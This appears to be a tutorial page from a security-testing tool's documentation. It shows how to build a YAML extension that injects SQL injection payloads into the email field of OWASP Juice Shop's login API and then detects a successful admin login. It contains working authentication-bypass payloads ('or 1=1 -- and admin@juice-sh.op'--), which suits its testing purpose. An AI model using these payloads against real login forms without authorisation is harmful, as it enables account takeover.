[link-app-examination]:     app-examination.md
[link-points]:              ../points/intro.md
[link-using-extension]:     ../using-extension.md
[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section

[doc-collect-phase]:        ../phase-collect.md
[doc-match-phase]:          ../phase-match.md
[doc-modify-phase]:         ../phase-modify.md
[doc-generate-phase]:       ../phase-generate.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project


#   Creation of Modifying Extension

The extension described in this document will modify an incoming baseline request to inject some payload into. These payloads could lead to exploitation of the SQLi vulnerability in the [“OWASP Juice Shop”][link-juice-shop] target application's login form.
  
##  Preparations

It is highly recommended to take these steps prior to creation of a FAST extension:
1.  [Investigate the behavior of the target application][link-app-examination] you are creating the extension for.
2.  [Read the principles of point construction for an extension][link-points].


##  Constructing the Extension

Create a file that describes the extension (e.g., `mod-extension.yaml`) and populate it with the required sections:

1.  [**The `meta-info` section**][link-meta-info].

    Prepare the description of the vulnerability that the extension will try to detect.
    
    * vulnerability header: `OWASP Juice Shop SQLi (mod extension)`
    * vulnerability description: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * vulnerability type: SQL injection
    * vulnerability threat level: high
    
    The corresponding `meta-info` section should look as follows:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **The `collect` section, the [Collect phase][doc-collect-phase]**.
    
    The REST API `POST /rest/user/login` method is called upon trying to log in.
    
    There is no need to create test requests for each of the baseline requests for logging in that were sent to the API as the testing for vulnerabilities will be performed the same way for each piece of data passed in the POST request.
    
    Set up the extension in such a way that it executes once when the API receives the request for logging in. To do so, add the Collect phase with the uniqueness condition to the extension.

    The `/rest/user/login` request to the API for logging in comprises:

    1.  the first part of the path with the `rest` value,
    2.  the second part of the path with the `user` value, and
    3.  the `login` action method
    
    The corresponding points that refer to these values are the following:

    1.  `PATH_0_value` for the first part of the path
    2.  `PATH_1_value` for the second part of the path
    3.  `ACTION_NAME_value` for the `login` action method
    
    If you add the condition that the combination of these three elements must be unique, then the extension will only run for the first `/rest/user/login` baseline request to the API (such request will be treated as unique one, and all the following requests to the API for logging in will not be unique). 
    
    Add the corresponding `collect` section to the extension YAML file. 
    
    ```
    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]
    ```

3.  **The `match` section, the [Match phase][doc-match-phase]**.
    
    It is necessary to check whether the incoming baseline requests is really the request to the API for logging in, because the extension we are creating will exploit the vulnerabilities that the login form contains.
    
    Set up the extension so that it only runs if a baseline request is targeted to the following URI: `/rest/user/login`. Add the Match phase that checks whether the received request contains the required elements. This can be done using the following `match` section:

    ```
    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'
    ```

4.  **The `modify` section, the [Modify phase][doc-modify-phase]**.
    
    Let us suggest that it is required to modify the baseline request to reach the following goals:
    * To clear the `Accept-Language` HTTP header value (this value is not required for vulnerability to be detected).
    * To replace the real values of the `email` and `password` parameters with the neutral `dummy` values.
    
    Add to the extension the following `modify` section that alters the request to meet the goals described above:
    
    ```
    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"
    ```
    
    !!! info "Request elements description syntax"
        Because the request data that is contained in the JSON format is stored in `<key: value>` pairs, the point that refers to the `email` element value will look as shown above. The point that refers to the `password` element value has a similar structure.
        
        To see detailed information about constructing the points, proceed to this [link][link-points].
 
5.  **The `generate` section, the [Generate phase][doc-generate-phase]**.

    It is known that there are two payloads that should replace the value of the `email` parameter in the baseline request in order to exploit the SQL injection vulnerability in the target application:
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
        
    !!! info "Inserting the payload into the modified request"
        The payload will be inserted into the previously modified request, because the extension contains the `modify` section. Thus, after inserting the first payload into the `email` field, the test request data should look as follows:
    
        ```
        {
            "email": "'or 1=1 --",
            "password":"dummy"
        }
        ```
    
        Because any password can be used to log in successfully due to the chosen payloads, it is not necessary to insert the payload into the password field, which will have a `dummy` value after the Modify phase is applied.
    
        Add the `generate` section that will create the test requests that meet the requirements discussed above.
    
        ```
        generate:
          - payload:
            - "'or 1=1 --"
            - "admin@juice-sh.op'--"
          - into: "POST_JSON_DOC_HASH_email_value"
          - method:
            - replace
        ```

6.  **The `detect` section, the [Detect phase][doc-detect-phase]**.
    
    The following conditions indicate that the user authentication with administrator's rights was successful:
    * The presence of the shopping cart identifier parameter with the `1` value in the response body. The parameter is in the JSON format and should look the following way:
    
        ```
        "bid":1
        ```
    
    * The presence of the user email parameter with the `admin@juice-sh.op` value in the response body. The parameter is in the JSON format and should look the following way:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Add the `detect` section that checks whether the attack was successful according to the conditions described above.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Escaping the special symbols"
    Remember to escape the special symbols in the strings.

##  Extension File

Now the `mod-extension.yaml` file contains the complete set of the sections required for the extension to operate. The listing of the file's content is below:

??? info "mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    collect:
      - uniq:
        - [PATH_0_value, PATH_1_value, ACTION_NAME_value]

    match:
      - PATH_0_value: 'rest'
      - PATH_1_value: 'user'
      - ACTION_NAME_value: 'login'

    modify:
      - "HEADER_ACCEPT-LANGUAGE_value": ""
      - "POST_JSON_DOC_HASH_email_value": "dummy"
      - "POST_JSON_DOC_HASH_password_value": "dummy"

    generate:
      - payload:
        - "'or 1=1 --"
        - "admin@juice-sh.op'--"
      - into: "POST_JSON_DOC_HASH_email_value"
      - method:
        - replace

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Using Extension

For detailed information about how to use the created expression, read [this document][link-using-extension]. 